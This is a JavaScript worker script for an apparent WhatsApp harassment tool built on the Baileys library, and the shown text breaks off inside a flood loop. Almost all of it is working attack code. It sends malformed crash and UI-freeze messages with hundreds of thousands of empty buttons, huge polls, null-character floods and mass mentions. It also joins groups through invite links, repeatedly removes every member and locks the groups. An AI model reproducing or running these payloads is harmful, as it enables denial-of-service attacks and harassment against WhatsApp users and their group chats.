// attackWorker.js
const { parentPort, workerData } = require('worker_threads');
const { proto, makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore, generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const { ForceInvis } = require('./forceinvis');

// ==================== DEBUG LOGGER ====================
const debugLog = (msg) => {
    process.stderr.write(`[WORKER] ${msg}\n`);
};

const SILENT_LOGGER = pino({ level: 'silent' });

// ==================== SLEEP HELPER ====================
const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ==================== MAIN RUN ====================
async function run() {
    const { authPath, attackType, targetJid, count, infiniteLoop } = workerData;

    debugLog(`=====================================`);
    debugLog(`Worker started`);
    debugLog(`  Attack Type: ${attackType}`);
    debugLog(`  Target: ${targetJid}`);
    debugLog(`  Count: ${count}`);
    debugLog(`  Auth Path: ${authPath}`);
    debugLog(`=====================================`);

    let sock = null;
    try {
        const { state } = await useMultiFileAuthState(authPath);
        debugLog(`Auth state loaded`);

        sock = makeWASocket({
            logger: SILENT_LOGGER,
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, SILENT_LOGGER),
            },
            browser: ['Mac OS', 'Safari', '10.15.7'],
            markOnlineOnConnect: false,
            syncFullHistory: false,
            shouldIgnoreJid: () => true,
            getMessage: async () => undefined,
        });

        debugLog(`Socket created, waiting for connection...`);

        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Worker connect timeout (15s)'));
            }, 15000);

            sock.ev.on('connection.update', (update) => {
                if (update.connection === 'open') {
                    clearTimeout(timeout);
                    debugLog(`Connected successfully!`);
                    resolve();
                }
                if (update.connection === 'close') {
                    clearTimeout(timeout);
                    const reason = update.lastDisconnect?.error?.message || 'unknown';
                    reject(new Error(`Connection closed: ${reason}`));
                }
            });
        });

        let success = 0;
        let failed = 0;

        let i = 0;
        const maxLoops = infiniteLoop ? Infinity : (count || 1);
        const totalDisplay = infiniteLoop ? '∞' : count;

        debugLog(`Starting attack loop (${totalDisplay} iterations)...`);

        // ── Pre-resolve group JID once, before the loop ──
        let preResolved = null;
        if (attackType === 'gbbannew' || attackType === 'bangroup' || attackType === 'crashgroup' || attackType === 'crashgrup') {
            try {
                preResolved = await resolveGroupJid(sock, targetJid);
                debugLog(`Pre-resolved group: ${preResolved.groupJid} (${preResolved.groupName}) — admin: ${preResolved.isAdmin ? 'YES' : 'no'}`);
            } catch (e) {
                // Hard fail — don't waste time retrying
                debugLog(`Pre-resolve FATAL: ${e.message}`);
                parentPort.postMessage({ type: 'error', error: `Cannot resolve group: ${e.message}` });
                try { sock.end(undefined); } catch (_) {}
                return;
            }
        }

        while (i < maxLoops) {
            debugLog(`--- Iteration ${i + 1}/${totalDisplay} ---`);
            try {
                if (attackType === 'forceinvis') {
                    debugLog(`[ForceInvis] Sending...`);
                    await ForceInvis(sock, targetJid);
                    debugLog(`[ForceInvis] ✅ Sent — sleeping 1500ms`);
                    await sleep(1500);
                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else if (attackType === 'ios') {
                    debugLog(`[iOS] Phase 1/2: iosfucker`);
                    await iosfucker(sock, targetJid);
                    await sleep(1500);

                    debugLog(`[iOS] Phase 2/2: iosnew`);
                    await iosnew(sock, targetJid);
                    await sleep(2000);

                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else if (attackType === 'forcevideo') {
                    debugLog(`[DelayHard] Phase 1/3: DelayXOnceExtesion`);
                    await DelayXOnceExtesion(sock, targetJid);
                    await sleep(2000);

                    debugLog(`[DelayHard] Phase 2/3: Delayforclosev2`);
                    await Delayforclosev2(sock, targetJid);
                    await sleep(4000);

                    debugLog(`[DelayHard] Phase 3/3: Delayforclose`);
                    await Delayforclose(sock, targetJid);
                    await sleep(3000);

                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else if (attackType === 'fcnoclick') {
                    debugLog(`[Freeze] Sending heavy payload...`);
                    await sendHeavyAndDelete(sock, targetJid);
                    await sleep(3000);

                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else if (attackType === 'blankios') {
                    debugLog(`[BlankIOS] Sending...`);
                    await blankios(sock, targetJid);
                    await sleep(1000);

                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else if (attackType === 'bangroup') {
                    debugLog(`[bangroup] Running kick-all cycle...`);
                    await bangroup(sock, targetJid, preResolved);
                    await sleep(1500);

                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else if (attackType === 'gbbannew') {
                    debugLog(`[gbbannew] Running advanced group ban cycle...`);
                    await gbbannew(sock, targetJid, preResolved);
                    await sleep(1500);

                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                // ✅ CRASHGROUP — multi-phase: uistuck + NewUpdateV1 + blankios
                else if (attackType === 'crashgroup' || attackType === 'crashgrup') {
                    debugLog(`[crashgroup] Running multi-phase crash cycle...`);
                    await crashgroup(sock, targetJid, preResolved);
                    debugLog(`[crashgroup] ✅ Cycle done — sleeping 1500ms`);
                    await sleep(1500);

                    success++;
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed });
                }

                else {
                    debugLog(`Unknown attack type: ${attackType}`);
                    throw new Error(`Unknown attack type: ${attackType}`);
                }
            } catch (err) {
                failed++;
                debugLog(`Iteration ${i + 1} FAILED: ${err.message}`);
                parentPort.postMessage({ type: 'progress', current: i + 1, total: totalDisplay, success, failed, error: err.message });
            }

            i++;
        }

        try { sock.end(undefined); } catch (e) {}

        debugLog(`=====================================`);
        debugLog(`Attack complete: ${success} success, ${failed} failed`);
        debugLog(`=====================================`);

        parentPort.postMessage({ type: 'done', success, failed, total: count });

    } catch (err) {
        debugLog(`FATAL ERROR: ${err.message}`);
        debugLog(`Stack: ${err.stack}`);
        try { if (sock) sock.end(undefined); } catch (e) {}
        parentPort.postMessage({ type: 'error', error: err.message });
    }
}

// ==================== Join Group Helper ====================
async function joinGroupSafe(sock, inviteCode) {
    debugLog(`[join] Attempting groupAcceptInvite with code: ${inviteCode}`);
    try {
        const result = await sock.groupAcceptInvite(inviteCode);
        debugLog(`[join] ✅ groupAcceptInvite OK: ${JSON.stringify(result)}`);
        return { joined: true, result };
    } catch (e) {
        const msg = (e.message || '').toLowerCase();
        const code = e?.output?.statusCode;

        if (msg.includes('conflict') || msg.includes('already') || code === 409) {
            debugLog(`[join] Already a member (409) — continuing`);
            return { joined: true, result: null };
        }
        if (code === 401 || msg.includes('not-authorized') || msg.includes('invalid')) {
            debugLog(`[join] ❌ Invite invalid/expired: ${e.message}`);
            return { joined: false, error: 'Invite link invalid or expired' };
        }
        if (code === 403 || msg.includes('forbidden')) {
            debugLog(`[join] ❌ Invite requires admin approval: ${e.message}`);
            return { joined: false, error: 'Group requires admin approval to join' };
        }
        debugLog(`[join] ⚠️ Unknown join error: ${e.message}`);
        return { joined: false, error: e.message };
    }
}

// ==================== Resolve target to group JID ====================
// No sync wait. Just joins, resolves the JID, does ONE metadata fetch (non-blocking).
// If the bot isn't in the group, the attack itself will fail fast with "forbidden".
async function resolveGroupJid(sock, target) {
    // Case 1: Invite link
    if (typeof target === 'string' && target.includes('chat.whatsapp.com/')) {
        const rawInvite = target.split('chat.whatsapp.com/')[1];
        const inviteCode = rawInvite.split('?')[0].split('/')[0];
        if (!inviteCode) throw new Error('Invalid group link');

        debugLog(`[resolve] Invite code: ${inviteCode}`);

        // Best-effort join
        const joinResult = await joinGroupSafe(sock, inviteCode);
        if (!joinResult.joined) {
            throw new Error(`Cannot join group: ${joinResult.error}`);
        }

        // Resolve JID
        let groupJid, groupName;
        try {
            const inviteInfo = await sock.groupGetInviteInfo(inviteCode);
            groupJid = inviteInfo.id;
            groupName = inviteInfo.subject;
            debugLog(`[resolve] Resolved → ${groupJid} (${groupName})`);
        } catch (e) {
            throw new Error(`Cannot resolve group link: ${e.message}`);
        }

        // ── ONE metadata fetch, non-blocking. No wait, no retry loop. ──
        let isAdmin = false;
        let metadata = null;
        try {
            metadata = await sock.groupMetadata(groupJid);
            const me = metadata.participants.find(p => p.id === sock.user.id);
            if (me) {
                isAdmin = me.admin === 'admin' || me.admin === 'superadmin';
                debugLog(`[resolve] Metadata OK — bot is member, admin: ${isAdmin ? 'YES' : 'no'}`);
            } else {
                debugLog(`[resolve] ⚠️ Metadata OK but bot not listed yet — proceeding anyway`);
            }
        } catch (e) {
            debugLog(`[resolve] ⚠️ Metadata fetch failed (${e.message}) — proceeding anyway`);
        }

        return { groupJid, groupName, isAdmin, metadata };
    }

    // Case 2: Already a JID
    if (target.includes('@g.us')) {
        debugLog(`[resolve] Target is already a JID: ${target}`);
        try {
            const meta = await sock.groupMetadata(target);
            const me = meta.participants.find(p => p.id === sock.user.id);
            return {
                groupJid: target,
                groupName: meta.subject,
                isAdmin: me ? (me.admin === 'admin' || me.admin === 'superadmin') : false,
                metadata: meta
            };
        } catch (e) {
            return { groupJid: target, groupName: '(unknown)', isAdmin: false, metadata: null };
        }
    }

    // Case 3: Phone number
    return { groupJid: target + '@g.us', groupName: '(unknown)', isAdmin: false, metadata: null };
}

// ==================== bangroup ====================
async function bangroup(sock, target, preResolved) {
    debugLog(`[bangroup] Executing on ${target}`);

    const resolved = preResolved || await resolveGroupJid(sock, target);
    const { groupJid, groupName, isAdmin, metadata } = resolved;

    debugLog(`[bangroup] Group: "${groupName}" (${groupJid}) — bot admin: ${isAdmin ? 'YES' : 'no'}`);

    const participants = (metadata?.participants || []).filter(p => p.id !== sock.user.id);
    if (participants.length === 0) {
        debugLog(`[bangroup] No other participants to kick`);
        return;
    }

    let kicked = 0, forbidden = 0, other = 0;
    for (const m of participants) {
        try {
            await sock.groupParticipantsUpdate(groupJid, [m.id], 'remove');
            kicked++;
        } catch (e) {
            const code = e?.output?.statusCode;
            if (code === 403 || (e.message || '').includes('forbidden')) forbidden++;
            else other++;
        }
        await sleep(15);
    }

    debugLog(`[bangroup] Result: ${kicked} kicked, ${forbidden} forbidden, ${other} other errors`);

    if (kicked === 0 && forbidden > 0 && !isAdmin) {
        throw new Error(`All kicks forbidden — bot must be ADMIN in "${groupName}"`);
    }
}

// ==================== gbbannew ====================
async function gbbannew(sock, target, preResolved) {
    debugLog(`[gbbannew] Executing on ${target}`);

    const resolved = preResolved || await resolveGroupJid(sock, target);
    const { groupJid, groupName, isAdmin, metadata } = resolved;

    debugLog(`[gbbannew] Group: "${groupName}" (${groupJid}) — bot admin: ${isAdmin ? 'YES' : 'no'}`);

    const participants = metadata?.participants || [];
    debugLog(`[gbbannew] Group has ${participants.length} participants`);

    let totalKicked = 0;
    let totalForbidden = 0;

    for (let i = 0; i < 20; i++) {
        debugLog(`[gbbannew] === Cycle ${i + 1}/20 ===`);
        let cycleKicked = 0;
        let cycleForbidden = 0;

        try {
            const freshMeta = await sock.groupMetadata(groupJid);
            const cycleParticipants = freshMeta.participants.filter(p => p.id !== sock.user.id);

            for (const m of cycleParticipants) {
                try {
                    await sock.groupParticipantsUpdate(groupJid, [m.id], 'remove');
                    cycleKicked++;
                } catch (e) {
                    const code = e?.output?.statusCode;
                    if (code === 403 || (e.message || '').includes('forbidden')) cycleForbidden++;
                }
                await sleep(15);
            }
            totalKicked += cycleKicked;
            totalForbidden += cycleForbidden;

            await sock.groupParticipantsUpdate(groupJid, ['0@s.whatsapp.net'], 'add').catch(() => {});
            await sleep(10);
            await sock.groupParticipantsUpdate(groupJid, ['0@s.whatsapp.net'], 'remove').catch(() => {});

            await sock.sendMessage(groupJid, {
                text: '\u200B'.repeat(3000) + '\u0000'.repeat(3000) + '\u202E'.repeat(1000),
            });

            await sock.groupSettingsUpdate(groupJid, 'announcement', true).catch(() => {});
            await sock.groupSettingsUpdate(groupJid, 'locked', true).catch(() => {});

            debugLog(`[gbbannew] Cycle ${i + 1} done — kicked ${cycleKicked}, forbidden ${cycleForbidden}`);
        } catch (e) {
            debugLog(`[gbbannew] Cycle ${i + 1} error: ${e.message}`);
        }
    }

    debugLog(`[gbbannew] ===== COMPLETE: ${totalKicked} kicked, ${totalForbidden} forbidden =====`);

    if (totalKicked === 0 && totalForbidden > 0 && !isAdmin) {
        throw new Error(`All kicks forbidden. Bot must be ADMIN in "${groupName}".`);
    }
}

// ==================== uistuck ====================
async function uistuck(sock, groupJid) {
    debugLog(`[uistuck] Sending visible UI freeze payloads to ${groupJid}`);

    const cycles = 3;
    const delayBetweenCycles = 2000;

    // ── Build massive interactive message (500k buttons) ──
    const interactivePayload = {
        interactiveMessage: {
            header: {
                title: "🔥 UI FREEZE",
                hasMediaAttachment: true,
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0&mms3=true",
                    mimetype: "application/pdf",
                    fileSha256: "7rOXceVPuGvMTfHN7VXURYOQV2ZmzxQ4xZ6cLM2JNPA=",
                    fileLength: 999999999,
                    pageCount: 1000,
                    mediaKey: "oohdpzQ3uCjBvJWx+2VmRj4bWsCiTvrpUftezu27bs4=",
                    fileName: "freeze.pdf",
                    fileEncSha256: "IT6Goux9voqfI50TST8rtFY9iVmxZenRz55JXZpAR2g=",
                    directPath: "/v/t62.7119-24/583550661_2366231810527044_2211533771736792774_n.enc?ccb=11-4&oh=01_Q5Aa4gE54f2r8LoDblReCmtq2DnGP-mSrNd-omujIcrP313Vlg&oe=6A3DBD88&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1779839963",
                    thumbnailDirectPath: "/v/t62.36145-24/705860036_1320514133375133_5228808273876536402_n.enc?ccb=11-4&oh=01_Q5Aa4gFkVLVWUFlX-Jk7uj1PdsnY5lmVp4lWmmQYdHkPsFhTUQ&oe=6A3DAF40&_nc_sid=5e03e0",
                    thumbnailSha256: "xK2z7ScS2wSQDxLVfdZ5e1BpIe+GsTv8KaVGAfufqjY=",
                    thumbnailEncSha256: "2N98oiJb8xii+D/KYAuHRq7Mg/8OIHFXNZQ5py4g9fM=",
                    jpegThumbnail: null,
                    contextInfo: {},
                    thumbnailHeight: 999,
                    thumbnailWidth: 999
                }
            },
            body: { text: "💢 UI FREEZE – Please wait..." },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({}))
            }
        }
    };

    // ── Build massive poll (20k options) ──
    const hugeText = "A".repeat(1000000);
    const pollPayload = {
        pollMessage: {
            name: "⏳ Stuck UI" + hugeText,
            options: Array.from({ length: 20000 }, (_, i) => `Option ${i}`),
            selectableCount: 1,
            contextInfo: {
                forwardingScore: 999999,
                isForwarded: true,
                quotedMessage: {
                    conversation: hugeText
                }
            }
        }
    };

    for (let i = 0; i < cycles; i++) {
        try {
            await sock.relayMessage(groupJid, interactivePayload, { noSelfSync: true });
            debugLog(`[uistuck] ✅ Interactive freeze #${i + 1} sent`);
        } catch (e) {
            debugLog(`[uistuck] ❌ Interactive freeze #${i + 1} failed: ${e.message}`);
        }

        try {
            await sock.relayMessage(groupJid, pollPayload, { noSelfSync: true });
            debugLog(`[uistuck] ✅ Poll freeze #${i + 1} sent`);
        } catch (e) {
            debugLog(`[uistuck] ❌ Poll freeze #${i + 1} failed: ${e.message}`);
        }

        if (i < cycles - 1) await sleep(delayBetweenCycles);
    }

    debugLog(`[uistuck] ✅ UI freeze attack completed (${cycles} cycles)`);
    return true;
}

// ==================== NewUpdateV1 ====================
async function NewUpdateV1(sock, groupJid) {
    debugLog(`[NewUpdateV1] Executing on ${groupJid}`);

    // ── Stage 1: image message with 500k buttons ──
    const LexMsg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: { text: "Iniochamy - Executed¿!" },
                    nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
                }
            }
        }
    };

    try {
        const Lexca = generateWAMessageFromContent(groupJid, LexMsg, {});
        await sock.relayMessage(groupJid, Lexca.message, {
            participant: groupJid,
            messageId: Lexca.key.id
        });
        debugLog(`[NewUpdateV1] Stage 1 done`);
    } catch (e) {
        debugLog(`[NewUpdateV1] Stage 1 failed: ${e.message}`);
    }

    // ── Stage 2: another heavy button message ──
    const Lexcaa = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "Lexcaabos - Executed¿!" },
                    nativeFlowMessage: { buttons: Array.from({ length: 500000 }, () => ({})) }
                }
            }
        }
    };

    try {
        const Lexcaabos = generateWAMessageFromContent(groupJid, Lexcaa, {});
        await sock.relayMessage(groupJid, Lexcaabos.message, {
            participant: groupJid,
            messageId: Lexcaabos.key.id
        });
        debugLog(`[NewUpdateV1] Stage 2 done`);
    } catch (e) {
        debugLog(`[NewUpdateV1] Stage 2 failed: ${e.message}`);
    }

    // ── Stage 3: malformed button payload ──
    const Msg = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: { text: "LexzyMods - iniochamy" },
                    nativeFlowMessage: { button: "\x10".repeat(2000) },
                },
            },
        },
    };

    try {
        const Lex = generateWAMessageFromContent(groupJid, Msg, {});
        await sock.relayMessage(groupJid, Lex.message, {
            participant: groupJid,
            messageId: Lex.key.id
        });
        debugLog(`[NewUpdateV1] Stage 3 done`);
    } catch (e) {
        debugLog(`[NewUpdateV1] Stage 3 failed: ${e.message}`);
    }

    // ── Stage 4: status broadcast with heavy image ──
    const ahk = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "iniochamy - Executed¿!",
                            fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                            fileLength: 9999999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "3q2+7wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                            fileEncSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
                            directPath: "/v/t62.7118-24/1234567890123456.enc?ccb=11-4&oh=abc123&oe=6A12ED53",
                            mediaKeyTimestamp: "1746057600",
                            jpegThumbnail: null,
                            scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
                            scanLengths: [9999999999999998555, 9999999999999998555, 9699999999999999148, 9969999999999999164],
                            midQualityFileSha256: "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
                            contextInfo: {
                                pairedMediaType: "PAIRED_PERMANENT",
                                isQuestion: true,
                                isGroupStatus: true,
                                remoteJid: "status@broadcast",
                                entryPointConversionDelaySeconds: 999999,
                                entryPointConversionSource: "ctwa"
                            }
                        }
                    }
                }
            }
        }
    };

    try {
        const ahkMsg = generateWAMessageFromContent(groupJid, ahk, {});
        await sock.relayMessage("status@broadcast", ahkMsg.message, {
            statusJidList: [groupJid],
            messageId: ahkMsg.key.id,
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: groupJid }, content: undefined }]
                }]
            }]
        });
        debugLog(`[NewUpdateV1] Stage 4 done`);
    } catch (e) {
        debugLog(`[NewUpdateV1] Stage 4 failed: ${e.message}`);
    }

    // ── Stage 5: sticker with 2000 mentions ──
    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, 0).toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    // ── Stage 6: viewOnce with huge mentionedJid ──
    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: { text: "\u0000".repeat(1000) },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: groupJid,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: { messageParamsJson: "ြ".repeat(9000) }
                }
            }
        }
    };

    try {
        const Nanas = generateWAMessageFromContent(groupJid, stickers, {});
        await sock.relayMessage("status@broadcast", Nanas.message, {
            messageId: Nanas.key.id,
            statusJidList: [groupJid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: groupJid }, content: undefined }]
                }]
            }]
        });
        debugLog(`[NewUpdateV1] Stage 5 done (sticker)`);
    } catch (e) {
        debugLog(`[NewUpdateV1] Stage 5 failed: ${e.message}`);
    }

    try {
        const Muda = generateWAMessageFromContent(groupJid, msg, {});
        await sock.relayMessage("status@broadcast", Muda.message, {
            messageId: Muda.key.id,
            statusJidList: [groupJid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: groupJid }, content: undefined }]
                }]
            }]
        });
        debugLog(`[NewUpdateV1] Stage 6 done (viewOnce)`);
    } catch (e) {
        debugLog(`[NewUpdateV1] Stage 6 failed: ${e.message}`);
    }

    // ── Stage 7: flood loop (30s) ──
    const startTime = Date.now();
    const duration = 30 * 1000;
    let floodCount = 0;

    debugLog(`[NewUpdateV1] Flood loop starting (30s)...`);
    while (Date.now() - startTime < duration) {
        try {
            await sock.relayMessage(groupJid, {
                groupStatusMessageV2: {
                    message: {
                        extendedTextMessage: {
                            text: "\u0000".repeat(75000),
                            contextInfo: {
                                participant: groupJid,
